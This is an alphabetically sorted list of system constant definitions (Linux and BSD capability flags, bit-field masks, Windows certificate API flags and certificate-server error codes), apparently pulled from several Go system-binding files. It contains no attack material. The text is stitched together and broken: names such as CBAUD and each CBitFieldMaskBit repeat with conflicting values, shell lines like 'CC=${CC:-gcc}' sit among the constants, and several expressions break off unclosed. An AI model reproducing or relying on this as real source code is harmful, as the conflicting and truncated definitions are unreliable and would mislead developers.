CAP_SETPCAP                                 = 0x8
CAP_SETSOCKOPT                 = 0x200002000000000
CAP_SETUID                                  = 0x7
CAP_SHUTDOWN                   = 0x200004000000000
CAP_SOCK_CLIENT                = 0x200007780000003
CAP_SOCK_SERVER                = 0x200007f60000003
CAP_SYMLINKAT                  = 0x200000008000400
CAP_SYSLOG                                  = 0x22
CAP_SYS_ADMIN                               = 0x15
CAP_SYS_BOOT                                = 0x16
CAP_SYS_CHROOT                              = 0x12
CAP_SYS_MODULE                              = 0x10
CAP_SYS_NICE                                = 0x17
CAP_SYS_PACCT                               = 0x14
CAP_SYS_PTRACE                              = 0x13
CAP_SYS_RAWIO                               = 0x11
CAP_SYS_RESOURCE                            = 0x18
CAP_SYS_TIME                                = 0x19
CAP_SYS_TTY_CONFIG                          = 0x1a
CAP_TTYHOOK                    = 0x400000000000100
CAP_UNLINKAT                   = 0x200000010000400
CAP_UNUSED0_44                 = 0x200080000000000
CAP_UNUSED0_57                 = 0x300000000000000
CAP_UNUSED1_22                 = 0x400000000200000
CAP_UNUSED1_57                 = 0x500000000000000
CAP_WAKE_ALARM                              = 0x23
CAP_WRITE                      = 0x200000000000002
CAT_E_CATIDNOEXIST                                                        Handle        = 0x80040160
CAT_E_FIRST                                                               syscall.Errno = 0x80040160
CAT_E_LAST                                                                syscall.Errno = 0x80040161
CAT_E_NODESCRIPTION                                                       Handle        = 0x80040161
CBAUD                            = 0x100f
CBAUD                            = 0xff
CBAUD                         = 0xf
CBAUDEX                          = 0x0
CBAUDEX                          = 0x1000
CBitFieldMaskBit0  = 0x1
CBitFieldMaskBit0  = 0x8000000000000000
CBitFieldMaskBit1  = 0x2
CBitFieldMaskBit1  = 0x4000000000000000
CBitFieldMaskBit10 = 0x20000000000000
CBitFieldMaskBit10 = 0x400
CBitFieldMaskBit11 = 0x10000000000000
CBitFieldMaskBit11 = 0x800
CBitFieldMaskBit12 = 0x1000
CBitFieldMaskBit12 = 0x8000000000000
CBitFieldMaskBit13 = 0x2000
CBitFieldMaskBit13 = 0x4000000000000
CBitFieldMaskBit14 = 0x2000000000000
CBitFieldMaskBit14 = 0x4000
CBitFieldMaskBit15 = 0x1000000000000
CBitFieldMaskBit15 = 0x8000
CBitFieldMaskBit16 = 0x10000
CBitFieldMaskBit16 = 0x800000000000
CBitFieldMaskBit17 = 0x20000
CBitFieldMaskBit17 = 0x400000000000
CBitFieldMaskBit18 = 0x200000000000
CBitFieldMaskBit18 = 0x40000
CBitFieldMaskBit19 = 0x100000000000
CBitFieldMaskBit19 = 0x80000
CBitFieldMaskBit2  = 0x2000000000000000
CBitFieldMaskBit2  = 0x4
CBitFieldMaskBit20 = 0x100000
CBitFieldMaskBit20 = 0x80000000000
CBitFieldMaskBit21 = 0x200000
CBitFieldMaskBit21 = 0x40000000000
CBitFieldMaskBit22 = 0x20000000000
CBitFieldMaskBit22 = 0x400000
CBitFieldMaskBit23 = 0x10000000000
CBitFieldMaskBit23 = 0x800000
CBitFieldMaskBit24 = 0x1000000
CBitFieldMaskBit24 = 0x8000000000
CBitFieldMaskBit25 = 0x2000000
CBitFieldMaskBit25 = 0x4000000000
CBitFieldMaskBit26 = 0x2000000000
CBitFieldMaskBit26 = 0x4000000
CBitFieldMaskBit27 = 0x1000000000
CBitFieldMaskBit27 = 0x8000000
CBitFieldMaskBit28 = 0x10000000
CBitFieldMaskBit28 = 0x800000000
CBitFieldMaskBit29 = 0x20000000
CBitFieldMaskBit29 = 0x400000000
CBitFieldMaskBit3  = 0x1000000000000000
CBitFieldMaskBit3  = 0x8
CBitFieldMaskBit30 = 0x200000000
CBitFieldMaskBit30 = 0x40000000
CBitFieldMaskBit31 = 0x100000000
CBitFieldMaskBit31 = 0x80000000
CBitFieldMaskBit32 = 0x100000000
CBitFieldMaskBit32 = 0x80000000
CBitFieldMaskBit33 = 0x200000000
CBitFieldMaskBit33 = 0x40000000
CBitFieldMaskBit34 = 0x20000000
CBitFieldMaskBit34 = 0x400000000
CBitFieldMaskBit35 = 0x10000000
CBitFieldMaskBit35 = 0x800000000
CBitFieldMaskBit36 = 0x1000000000
CBitFieldMaskBit36 = 0x8000000
CBitFieldMaskBit37 = 0x2000000000
CBitFieldMaskBit37 = 0x4000000
CBitFieldMaskBit38 = 0x2000000
CBitFieldMaskBit38 = 0x4000000000
CBitFieldMaskBit39 = 0x1000000
CBitFieldMaskBit39 = 0x8000000000
CBitFieldMaskBit4  = 0x10
CBitFieldMaskBit4  = 0x800000000000000
CBitFieldMaskBit40 = 0x10000000000
CBitFieldMaskBit40 = 0x800000
CBitFieldMaskBit41 = 0x20000000000
CBitFieldMaskBit41 = 0x400000
CBitFieldMaskBit42 = 0x200000
CBitFieldMaskBit42 = 0x40000000000
CBitFieldMaskBit43 = 0x100000
CBitFieldMaskBit43 = 0x80000000000
CBitFieldMaskBit44 = 0x100000000000
CBitFieldMaskBit44 = 0x80000
CBitFieldMaskBit45 = 0x200000000000
CBitFieldMaskBit45 = 0x40000
CBitFieldMaskBit46 = 0x20000
CBitFieldMaskBit46 = 0x400000000000
CBitFieldMaskBit47 = 0x10000
CBitFieldMaskBit47 = 0x800000000000
CBitFieldMaskBit48 = 0x1000000000000
CBitFieldMaskBit48 = 0x8000
CBitFieldMaskBit49 = 0x2000000000000
CBitFieldMaskBit49 = 0x4000
CBitFieldMaskBit5  = 0x20
CBitFieldMaskBit5  = 0x400000000000000
CBitFieldMaskBit50 = 0x2000
CBitFieldMaskBit50 = 0x4000000000000
CBitFieldMaskBit51 = 0x1000
CBitFieldMaskBit51 = 0x8000000000000
CBitFieldMaskBit52 = 0x10000000000000
CBitFieldMaskBit52 = 0x800
CBitFieldMaskBit53 = 0x20000000000000
CBitFieldMaskBit53 = 0x400
CBitFieldMaskBit54 = 0x200
CBitFieldMaskBit54 = 0x40000000000000
CBitFieldMaskBit55 = 0x100
CBitFieldMaskBit55 = 0x80000000000000
CBitFieldMaskBit56 = 0x100000000000000
CBitFieldMaskBit56 = 0x80
CBitFieldMaskBit57 = 0x200000000000000
CBitFieldMaskBit57 = 0x40
CBitFieldMaskBit58 = 0x20
CBitFieldMaskBit58 = 0x400000000000000
CBitFieldMaskBit59 = 0x10
CBitFieldMaskBit59 = 0x800000000000000
CBitFieldMaskBit6  = 0x200000000000000
CBitFieldMaskBit6  = 0x40
CBitFieldMaskBit60 = 0x1000000000000000
CBitFieldMaskBit60 = 0x8
CBitFieldMaskBit61 = 0x2000000000000000
CBitFieldMaskBit61 = 0x4
CBitFieldMaskBit62 = 0x2
CBitFieldMaskBit62 = 0x4000000000000000
CBitFieldMaskBit63 = 0x1
CBitFieldMaskBit63 = 0x8000000000000000
CBitFieldMaskBit7  = 0x100000000000000
CBitFieldMaskBit7  = 0x80
CBitFieldMaskBit8  = 0x100
CBitFieldMaskBit8  = 0x80000000000000
CBitFieldMaskBit9  = 0x200
CBitFieldMaskBit9  = 0x40000000000000
CC=${CC:-cc}
CC=${CC:-gcc}
CEPH_SUPER_MAGIC                            = 0xc36400
CERTSRV_E_ADMIN_DENIED_REQUEST                                            Handle        = 0x80094014
CERTSRV_E_ALIGNMENT_FAULT                                                 Handle        = 0x80094010
CERTSRV_E_ARCHIVED_KEY_REQUIRED                                           Handle        = 0x80094804
CERTSRV_E_ARCHIVED_KEY_UNEXPECTED                                         Handle        = 0x80094810
CERTSRV_E_BAD_RENEWAL_CERT_ATTRIBUTE                                      Handle        = 0x8009400E
CERTSRV_E_BAD_RENEWAL_SUBJECT                                             Handle        = 0x80094806
CERTSRV_E_BAD_REQUESTSTATUS                                               Handle        = 0x80094003
CERTSRV_E_BAD_REQUESTSUBJECT                                              Handle        = 0x80094001
CERTSRV_E_BAD_REQUEST_KEY_ARCHIVAL                                        Handle        = 0x8009400C
CERTSRV_E_BAD_TEMPLATE_VERSION                                            Handle        = 0x80094807
CERTSRV_E_CERT_TYPE_OVERLAP                                               Handle        = 0x80094814
CERTSRV_E_CORRUPT_KEY_ATTESTATION                                         Handle        = 0x8009481B
CERTSRV_E_DOWNLEVEL_DC_SSL_OR_UPGRADE                                     Handle        = 0x80094013
CERTSRV_E_ENCODING_LENGTH                                                 Handle        = 0x80094007
CERTSRV_E_ENCRYPTION_CERT_REQUIRED                                        Handle        = 0x80094018
CERTSRV_E_ENROLL_DENIED                                                   Handle        = 0x80094011
CERTSRV_E_EXPIRED_CHALLENGE                                               Handle        = 0x8009481C
CERTSRV_E_INVALID_ATTESTATION                                             Handle        = 0x80094819
CERTSRV_E_INVALID_CA_CERTIFICATE                                          Handle        = 0x80094005
CERTSRV_E_INVALID_EK                                                      Handle        = 0x80094817
CERTSRV_E_INVALID_IDBINDING                                               Handle        = 0x80094818
CERTSRV_E_INVALID_REQUESTID                                               Handle        = 0x8009481E
CERTSRV_E_INVALID_RESPONSE                                                Handle        = 0x8009481D
CERTSRV_E_ISSUANCE_POLICY_REQUIRED                                        Handle        = 0x8009480C
CERTSRV_E_KEY_ARCHIVAL_NOT_CONFIGURED                                     Handle        = 0x8009400A
CERTSRV_E_KEY_ATTESTATION                                                 Handle        = 0x8009481A
CERTSRV_E_KEY_ATTESTATION_NOT_SUPPORTED                                   Handle        = 0x80094017
CERTSRV_E_KEY_LENGTH                                                      Handle        = 0x80094811
CERTSRV_E_NO_CAADMIN_DEFINED                                              Handle        = 0x8009400D
CERTSRV_E_NO_CERT_TYPE                                                    Handle        = 0x80094801
CERTSRV_E_NO_DB_SESSIONS                                                  Handle        = 0x8009400F
CERTSRV_E_NO_POLICY_SERVER                                                Handle        = 0x80094015
CERTSRV_E_NO_REQUEST                                                      Handle        = 0x80094002
CERTSRV_E_NO_VALID_KRA                                                    Handle        = 0x8009400B
CERTSRV_E_PENDING_CLIENT_RESPONSE                                         Handle        = 0x80094820
CERTSRV_E_PROPERTY_EMPTY                                                  Handle        = 0x80094004
CERTSRV_E_RENEWAL_BAD_PUBLIC_KEY                                          Handle        = 0x80094816
CERTSRV_E_REQUEST_PRECERTIFICATE_MISMATCH                                 Handle        = 0x8009481F
CERTSRV_E_RESTRICTEDOFFICER                                               Handle        = 0x80094009
CERTSRV_E_ROLECONFLICT                                                    Handle        = 0x80094008
CERTSRV_E_SERVER_SUSPENDED                                                Handle        = 0x80094006
CERTSRV_E_SIGNATURE_COUNT                                                 Handle        = 0x8009480A
CERTSRV_E_SIGNATURE_POLICY_REQUIRED                                       Handle        = 0x80094809
CERTSRV_E_SIGNATURE_REJECTED                                              Handle        = 0x8009480B
CERTSRV_E_SMIME_REQUIRED                                                  Handle        = 0x80094805
CERTSRV_E_SUBJECT_ALT_NAME_REQUIRED                                       Handle        = 0x80094803
CERTSRV_E_SUBJECT_DIRECTORY_GUID_REQUIRED                                 Handle        = 0x8009480E
CERTSRV_E_SUBJECT_DNS_REQUIRED                                            Handle        = 0x8009480F
CERTSRV_E_SUBJECT_EMAIL_REQUIRED                                          Handle        = 0x80094812
CERTSRV_E_SUBJECT_UPN_REQUIRED                                            Handle        = 0x8009480D
CERTSRV_E_TEMPLATE_CONFLICT                                               Handle        = 0x80094802
CERTSRV_E_TEMPLATE_DENIED                                                 Handle        = 0x80094012
CERTSRV_E_TEMPLATE_POLICY_REQUIRED                                        Handle        = 0x80094808
CERTSRV_E_TOO_MANY_SIGNATURES                                             Handle        = 0x80094815
CERTSRV_E_UNKNOWN_CERT_TYPE                                               Handle        = 0x80094813
CERTSRV_E_UNSUPPORTED_CERT_TYPE                                           Handle        = 0x80094800
CERTSRV_E_WEAK_SIGNATURE_OR_KEY                                           Handle        = 0x80094016
CERT_CHAIN_FIND_BY_ISSUER = 1
CERT_CHAIN_FIND_BY_ISSUER_CACHE_ONLY_FLAG     = 0x8000
CERT_CHAIN_FIND_BY_ISSUER_CACHE_ONLY_URL_FLAG = 0x0004
CERT_CHAIN_FIND_BY_ISSUER_COMPARE_KEY_FLAG    = 0x0001
CERT_CHAIN_FIND_BY_ISSUER_COMPLEX_CHAIN_FLAG  = 0x0002
CERT_CHAIN_FIND_BY_ISSUER_LOCAL_MACHINE_FLAG  = 0x0008
CERT_CHAIN_FIND_BY_ISSUER_NO_KEY_FLAG         = 0x4000
CERT_CHAIN_POLICY_AUTHENTICODE      = 2
CERT_CHAIN_POLICY_AUTHENTICODE_TS   = 3
CERT_CHAIN_POLICY_BASE              = 1
CERT_CHAIN_POLICY_BASIC_CONSTRAINTS = 5
CERT_CHAIN_POLICY_EV                = 8
CERT_CHAIN_POLICY_MICROSOFT_ROOT    = 7
CERT_CHAIN_POLICY_NT_AUTH           = 6
CERT_CHAIN_POLICY_SSL               = 4
CERT_CHAIN_POLICY_SSL_F12           = 9
CERT_CLOSE_STORE_CHECK_FLAG = 0x00000002
CERT_CLOSE_STORE_FORCE_FLAG = 0x00000001
CERT_COMPARE_ANY                      = 0
CERT_COMPARE_ATTR                     = 3
CERT_COMPARE_CERT_ID                  = 16
CERT_COMPARE_CROSS_CERT_DIST_POINTS   = 17
CERT_COMPARE_CTL_USAGE                = CERT_COMPARE_ENHKEY_USAGE
CERT_COMPARE_ENHKEY_USAGE             = 10
CERT_COMPARE_EXISTING                 = 13
CERT_COMPARE_HASH                     = CERT_COMPARE_SHA1_HASH
CERT_COMPARE_HASH_STR                 = 20
CERT_COMPARE_HAS_PRIVATE_KEY          = 21
CERT_COMPARE_ISSUER_OF                = 12
CERT_COMPARE_KEY_IDENTIFIER           = 15
CERT_COMPARE_KEY_SPEC                 = 9
CERT_COMPARE_MASK                     = 0xFFFF
CERT_COMPARE_MD5_HASH                 = 4
CERT_COMPARE_NAME                     = 2
CERT_COMPARE_NAME_STR_A               = 7
CERT_COMPARE_NAME_STR_W               = 8
CERT_COMPARE_PROPERTY                 = 5
CERT_COMPARE_PUBKEY_MD5_HASH          = 18
CERT_COMPARE_PUBLIC_KEY               = 6
CERT_COMPARE_SHA1_HASH                = 1
CERT_COMPARE_SHIFT                    = 16
CERT_COMPARE_SIGNATURE_HASH           = 14
CERT_COMPARE_SUBJECT_CERT             = 11
CERT_COMPARE_SUBJECT_INFO_ACCESS      = 19
CERT_E_CHAINING                                                           Handle        = 0x800B010A
CERT_E_CN_NO_MATCH                                                        Handle        = 0x800B010F
CERT_E_CRITICAL                                                           Handle        = 0x800B0105
CERT_E_EXPIRED                                                            Handle        = 0x800B0101
CERT_E_INVALID_NAME                                                       Handle        = 0x800B0114
CERT_E_INVALID_POLICY                                                     Handle        = 0x800B0113
CERT_E_ISSUERCHAINING                                                     Handle        = 0x800B0107
CERT_E_MALFORMED                                                          Handle        = 0x800B0108
CERT_E_PATHLENCONST                                                       Handle        = 0x800B0104
CERT_E_PURPOSE                                                            Handle        = 0x800B0106
CERT_E_REVOCATION_FAILURE                                                 Handle        = 0x800B010E
CERT_E_REVOKED                                                            Handle        = 0x800B010C
CERT_E_ROLE                                                               Handle        = 0x800B0103
CERT_E_UNTRUSTEDCA                                                        Handle        = 0x800B0112
CERT_E_UNTRUSTEDROOT                                                      Handle        = 0x800B0109
CERT_E_UNTRUSTEDTESTROOT                                                  Handle        = 0x800B010D
CERT_E_VALIDITYPERIODNESTING                                              Handle        = 0x800B0102
CERT_E_WRONG_USAGE                                                        Handle        = 0x800B0110
CERT_FILE_STORE_COMMIT_ENABLE_FLAG   = 0x00010000
CERT_FIND_ANY                         = (CERT_COMPARE_ANY << CERT_COMPARE_SHIFT)
CERT_FIND_CERT_ID                     = (CERT_COMPARE_CERT_ID << CERT_COMPARE_SHIFT)
CERT_FIND_CROSS_CERT_DIST_POINTS      = (CERT_COMPARE_CROSS_CERT_DIST_POINTS << CERT_COMPARE_SHIFT)
CERT_FIND_CTL_USAGE                   = CERT_FIND_ENHKEY_USAGE
CERT_FIND_ENHKEY_USAGE                = (CERT_COMPARE_ENHKEY_USAGE << CERT_COMPARE_SHIFT)
CERT_FIND_EXISTING                    = (CERT_COMPARE_EXISTING << CERT_COMPARE_SHIFT)
CERT_FIND_EXT_ONLY_CTL_USAGE_FLAG     = CERT_FIND_EXT_ONLY_ENHKEY_USAGE_FLAG
CERT_FIND_EXT_ONLY_ENHKEY_USAGE_FLAG  = 0x2
CERT_FIND_HASH                        = CERT_FIND_SHA1_HASH
CERT_FIND_HASH_STR                    = (CERT_COMPARE_HASH_STR << CERT_COMPARE_SHIFT)
CERT_FIND_HAS_PRIVATE_KEY             = (CERT_COMPARE_HAS_PRIVATE_KEY << CERT_COMPARE_SHIFT)
CERT_FIND_ISSUER_ATTR                 = (CERT_COMPARE_ATTR<<CERT_COMPARE_SHIFT 
CERT_FIND_ISSUER_NAME                 = (CERT_COMPARE_NAME<<CERT_COMPARE_SHIFT 
CERT_FIND_ISSUER_OF                   = (CERT_COMPARE_ISSUER_OF << CERT_COMPARE_SHIFT)
CERT_FIND_ISSUER_STR                  = CERT_FIND_ISSUER_STR_W
CERT_FIND_ISSUER_STR_A                = (CERT_COMPARE_NAME_STR_A<<CERT_COMPARE_SHIFT 
CERT_FIND_ISSUER_STR_W                = (CERT_COMPARE_NAME_STR_W<<CERT_COMPARE_SHIFT 
CERT_FIND_KEY_IDENTIFIER              = (CERT_COMPARE_KEY_IDENTIFIER << CERT_COMPARE_SHIFT)
CERT_FIND_KEY_SPEC                    = (CERT_COMPARE_KEY_SPEC << CERT_COMPARE_SHIFT)
CERT_FIND_MD5_HASH                    = (CERT_COMPARE_MD5_HASH << CERT_COMPARE_SHIFT)
CERT_FIND_NO_CTL_USAGE_FLAG           = CERT_FIND_NO_ENHKEY_USAGE_FLAG
CERT_FIND_NO_ENHKEY_USAGE_FLAG        = 0x8
CERT_FIND_OPTIONAL_CTL_USAGE_FLAG     = CERT_FIND_OPTIONAL_ENHKEY_USAGE_FLAG
CERT_FIND_OPTIONAL_ENHKEY_USAGE_FLAG  = 0x1
CERT_FIND_OR_CTL_USAGE_FLAG           = CERT_FIND_OR_ENHKEY_USAGE_FLAG
CERT_FIND_OR_ENHKEY_USAGE_FLAG        = 0x10
CERT_FIND_PROPERTY                    = (CERT_COMPARE_PROPERTY << CERT_COMPARE_SHIFT)
CERT_FIND_PROP_ONLY_CTL_USAGE_FLAG    = CERT_FIND_PROP_ONLY_ENHKEY_USAGE_FLAG
CERT_FIND_PROP_ONLY_ENHKEY_USAGE_FLAG = 0x4
CERT_FIND_PUBKEY_MD5_HASH             = (CERT_COMPARE_PUBKEY_MD5_HASH << CERT_COMPARE_SHIFT)
CERT_FIND_PUBLIC_KEY                  = (CERT_COMPARE_PUBLIC_KEY << CERT_COMPARE_SHIFT)
CERT_FIND_SHA1_HASH                   = (CERT_COMPARE_SHA1_HASH << CERT_COMPARE_SHIFT)
CERT_FIND_SIGNATURE_HASH              = (CERT_COMPARE_SIGNATURE_HASH << CERT_COMPARE_SHIFT)
CERT_FIND_SUBJECT_ATTR                = (CERT_COMPARE_ATTR<<CERT_COMPARE_SHIFT 
CERT_FIND_SUBJECT_CERT                = (CERT_COMPARE_SUBJECT_CERT << CERT_COMPARE_SHIFT)
CERT_FIND_SUBJECT_INFO_ACCESS         = (CERT_COMPARE_SUBJECT_INFO_ACCESS << CERT_COMPARE_SHIFT)
CERT_FIND_SUBJECT_NAME                = (CERT_COMPARE_NAME<<CERT_COMPARE_SHIFT 
CERT_FIND_SUBJECT_STR                 = CERT_FIND_SUBJECT_STR_W
CERT_FIND_SUBJECT_STR_A               = (CERT_COMPARE_NAME_STR_A<<CERT_COMPARE_SHIFT 
CERT_FIND_SUBJECT_STR_W               = (CERT_COMPARE_NAME_STR_W<<CERT_COMPARE_SHIFT 
CERT_FIND_VALID_CTL_USAGE_FLAG        = CERT_FIND_VALID_ENHKEY_USAGE_FLAG
CERT_FIND_VALID_ENHKEY_USAGE_FLAG     = 0x20
CERT_INFO_EXTENSION_FLAG               = 11
CERT_INFO_ISSUER_FLAG                  = 4
CERT_INFO_ISSUER_UNIQUE_ID_FLAG        = 9
CERT_INFO_NOT_AFTER_FLAG               = 6
CERT_INFO_NOT_BEFORE_FLAG              = 5
CERT_INFO_SERIAL_NUMBER_FLAG           = 2
CERT_INFO_SIGNATURE_ALGORITHM_FLAG     = 3
CERT_INFO_SUBJECT_FLAG                 = 7
CERT_INFO_SUBJECT_PUBLIC_KEY_INFO_FLAG = 8
CERT_INFO_SUBJECT_UNIQUE_ID_FLAG       = 10
CERT_INFO_VERSION_FLAG                 = 1
CERT_LDAP_STORE_AREC_EXCLUSIVE_FLAG  = 0x00020000
CERT_LDAP_STORE_OPENED_FLAG          = 0x00040000
CERT_LDAP_STORE_SIGN_FLAG            = 0x00010000
CERT_LDAP_STORE_UNBIND_FLAG          = 0x00080000
CERT_NAME_ATTR_TYPE             = 3
CERT_NAME_DISABLE_IE4_UTF8_FLAG    = 0x10000
CERT_NAME_DNS_TYPE              = 6
CERT_NAME_EMAIL_TYPE            = 1
CERT_NAME_FRIENDLY_DISPLAY_TYPE = 5
CERT_NAME_ISSUER_FLAG              = 0x1
CERT_NAME_RDN_TYPE              = 2
CERT_NAME_SEARCH_ALL_NAMES_FLAG    = 0x2
CERT_NAME_SIMPLE_DISPLAY_TYPE   = 4
CERT_NAME_STR_ENABLE_PUNYCODE_FLAG = 0x00200000
CERT_NAME_UPN_TYPE              = 8
CERT_NAME_URL_TYPE              = 7
CERT_NCRYPT_KEY_SPEC = 0xFFFFFFFF
CERT_QUERY_CONTENT_CERT                    = 1
CERT_QUERY_CONTENT_CERT_PAIR               = 13
CERT_QUERY_CONTENT_CRL                     = 3
CERT_QUERY_CONTENT_CTL                     = 2
CERT_QUERY_CONTENT_FLAG_ALL                = (CERT_QUERY_CONTENT_FLAG_CERT 
CERT_QUERY_CONTENT_FLAG_ALL_ISSUER_CERT    = (CERT_QUERY_CONTENT_FLAG_CERT 
CERT_QUERY_CONTENT_FLAG_CERT               = (1 << CERT_QUERY_CONTENT_CERT)
CERT_QUERY_CONTENT_FLAG_CERT_PAIR          = (1 << CERT_QUERY_CONTENT_CERT_PAIR)
CERT_QUERY_CONTENT_FLAG_CRL                = (1 << CERT_QUERY_CONTENT_CRL)
CERT_QUERY_CONTENT_FLAG_CTL                = (1 << CERT_QUERY_CONTENT_CTL)
CERT_QUERY_CONTENT_FLAG_PFX                = (1 << CERT_QUERY_CONTENT_PFX)
CERT_QUERY_CONTENT_FLAG_PFX_AND_LOAD       = (1 << CERT_QUERY_CONTENT_PFX_AND_LOAD)
CERT_QUERY_CONTENT_FLAG_PKCS10             = (1 << CERT_QUERY_CONTENT_PKCS10)
CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED       = (1 << CERT_QUERY_CONTENT_PKCS7_SIGNED)
CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED = (1 << CERT_QUERY_CONTENT_PKCS7_SIGNED_EMBED)
CERT_QUERY_CONTENT_FLAG_PKCS7_UNSIGNED     = (1 << CERT_QUERY_CONTENT_PKCS7_UNSIGNED)
CERT_QUERY_CONTENT_FLAG_SERIALIZED_CERT    = (1 << CERT_QUERY_CONTENT_SERIALIZED_CERT)
CERT_QUERY_CONTENT_FLAG_SERIALIZED_CRL     = (1 << CERT_QUERY_CONTENT_SERIALIZED_CRL)
CERT_QUERY_CONTENT_FLAG_SERIALIZED_CTL     = (1 << CERT_QUERY_CONTENT_SERIALIZED_CTL)
CERT_QUERY_CONTENT_FLAG_SERIALIZED_STORE   = (1 << CERT_QUERY_CONTENT_SERIALIZED_STORE)
CERT_QUERY_CONTENT_PFX                     = 12
CERT_QUERY_CONTENT_PFX_AND_LOAD            = 14
CERT_QUERY_CONTENT_PKCS10                  = 11
CERT_QUERY_CONTENT_PKCS7_SIGNED            = 8
CERT_QUERY_CONTENT_PKCS7_SIGNED_EMBED      = 10
CERT_QUERY_CONTENT_PKCS7_UNSIGNED          = 9
CERT_QUERY_CONTENT_SERIALIZED_CERT         = 5
CERT_QUERY_CONTENT_SERIALIZED_CRL          = 7
CERT_QUERY_CONTENT_SERIALIZED_CTL          = 6
CERT_QUERY_CONTENT_SERIALIZED_STORE        = 4
CERT_QUERY_FORMAT_ASN_ASCII_HEX_ENCODED      = 3
CERT_QUERY_FORMAT_BASE64_ENCODED             = 2
CERT_QUERY_FORMAT_BINARY                     = 1
CERT_QUERY_FORMAT_FLAG_ALL                   = (CERT_QUERY_FORMAT_FLAG_BINARY 
CERT_QUERY_FORMAT_FLAG_ASN_ASCII_HEX_ENCODED = (1 << CERT_QUERY_FORMAT_ASN_ASCII_HEX_ENCODED)
CERT_QUERY_FORMAT_FLAG_BASE64_ENCODED        = (1 << CERT_QUERY_FORMAT_BASE64_ENCODED)
CERT_QUERY_FORMAT_FLAG_BINARY                = (1 << CERT_QUERY_FORMAT_BINARY)
CERT_QUERY_OBJECT_BLOB = 2
CERT_QUERY_OBJECT_FILE = 1
CERT_REGISTRY_STORE_CLIENT_GPT_FLAG  = 0x80000000
CERT_REGISTRY_STORE_LM_GPT_FLAG      = 0x01000000
CERT_REGISTRY_STORE_MY_IE_DIRTY_FLAG = 0x00080000
CERT_REGISTRY_STORE_REMOTE_FLAG      = 0x00010000
CERT_REGISTRY_STORE_ROAMING_FLAG     = 0x00040000
CERT_REGISTRY_STORE_SERIALIZED_FLAG  = 0x00020000
CERT_STORE_ADD_ALWAYS                              = 4
CERT_STORE_ADD_NEW                                 = 1
CERT_STORE_ADD_NEWER                               = 6
CERT_STORE_ADD_NEWER_INHERIT_PROPERTIES            = 7
CERT_STORE_ADD_REPLACE_EXISTING                    = 3
CERT_STORE_ADD_REPLACE_EXISTING_INHERIT_PROPERTIES = 5
CERT_STORE_ADD_USE_EXISTING                        = 2
CERT_STORE_BACKUP_RESTORE_FLAG              = 0x00000800
CERT_STORE_CREATE_NEW_FLAG                  = 0x00002000
CERT_STORE_DEFER_CLOSE_UNTIL_LAST_FREE_FLAG = 0x00000004
CERT_STORE_DELETE_FLAG                      = 0x00000010
CERT_STORE_ENUM_ARCHIVED_FLAG               = 0x00000200
CERT_STORE_MANIFOLD_FLAG                    = 0x00000100
CERT_STORE_MAXIMUM_ALLOWED_FLAG             = 0x00001000
CERT_STORE_NO_CRYPT_RELEASE_FLAG            = 0x00000001
CERT_STORE_OPEN_EXISTING_FLAG               = 0x00004000
CERT_STORE_PROV_COLLECTION        = 11
CERT_STORE_PROV_FILE              = 3
CERT_STORE_PROV_FILENAME          = CERT_STORE_PROV_FILENAME_W
CERT_STORE_PROV_FILENAME_A        = 7
CERT_STORE_PROV_FILENAME_W        = 8
CERT_STORE_PROV_LDAP              = CERT_STORE_PROV_LDAP_W
CERT_STORE_PROV_LDAP_W            = 16
CERT_STORE_PROV_MEMORY            = 2
CERT_STORE_PROV_MSG               = 1
CERT_STORE_PROV_PHYSICAL          = CERT_STORE_PROV_PHYSICAL_W
CERT_STORE_PROV_PHYSICAL_W        = 14
CERT_STORE_PROV_PKCS12            = 17
CERT_STORE_PROV_PKCS7             = 5
CERT_STORE_PROV_REG               = 4
CERT_STORE_PROV_SERIALIZED        = 6
CERT_STORE_PROV_SMART_CARD        = CERT_STORE_PROV_SMART_CARD_W
CERT_STORE_PROV_SMART_CARD_W      = 15
CERT_STORE_PROV_SYSTEM            = CERT_STORE_PROV_SYSTEM_W
CERT_STORE_PROV_SYSTEM_A          = 9
CERT_STORE_PROV_SYSTEM_REGISTRY   = CERT_STORE_PROV_SYSTEM_REGISTRY_W
CERT_STORE_PROV_SYSTEM_REGISTRY_A = 12
CERT_STORE_PROV_SYSTEM_REGISTRY_W = 13
CERT_STORE_PROV_SYSTEM_W          = 10
CERT_STORE_READONLY_FLAG                    = 0x00008000
CERT_STORE_SET_LOCALIZED_NAME_FLAG          = 0x00000002
CERT_STORE_SHARE_CONTEXT_FLAG               = 0x00000080
CERT_STORE_SHARE_STORE_FLAG                 = 0x00000040
CERT_STORE_UNSAFE_PHYSICAL_FLAG             = 0x00000020
CERT_STORE_UPDATE_KEYID_FLAG                = 0x00000400
CERT_SYSTEM_STORE_CURRENT_SERVICE            = 0x00040000
CERT_SYSTEM_STORE_CURRENT_USER               = 0x00010000
CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY  = 0x00070000
CERT_SYSTEM_STORE_LOCAL_MACHINE              = 0x00020000
CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE   = 0x00090000
CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY = 0x00080000
CERT_SYSTEM_STORE_RELOCATE_FLAG              = 0x80000000
CERT_SYSTEM_STORE_SERVICES                   = 0x00050000
CERT_SYSTEM_STORE_UNPROTECTED_FLAG           = 0x40000000
CERT_SYSTEM_STORE_USERS                      = 0x00060000
CERT_TRUST_CTL_IS_NOT_SIGNATURE_VALID        = 0x00040000
CERT_TRUST_CTL_IS_NOT_TIME_VALID             = 0x00020000
CERT_TRUST_CTL_IS_NOT_VALID_FOR_USAGE        = 0x00080000
CERT_TRUST_HAS_CRL_VALIDITY_EXTENDED     = 0x00001000
CERT_TRUST_HAS_EXACT_MATCH_ISSUER        = 0x00000001
CERT_TRUST_HAS_EXCLUDED_NAME_CONSTRAINT      = 0x00008000
CERT_TRUST_HAS_ISSUANCE_CHAIN_POLICY     = 0x00000400
CERT_TRUST_HAS_KEY_MATCH_ISSUER          = 0x00000002
CERT_TRUST_HAS_NAME_MATCH_ISSUER         = 0x00000004
CERT_TRUST_HAS_NOT_DEFINED_NAME_CONSTRAINT   = 0x00002000
CERT_TRUST_HAS_NOT_PERMITTED_NAME_CONSTRAINT = 0x00004000
CERT_TRUST_HAS_NOT_SUPPORTED_CRITICAL_EXT    = 0x08000000
CERT_TRUST_HAS_NOT_SUPPORTED_NAME_CONSTRAINT = 0x00001000
CERT_TRUST_HAS_PREFERRED_ISSUER          = 0x00000100
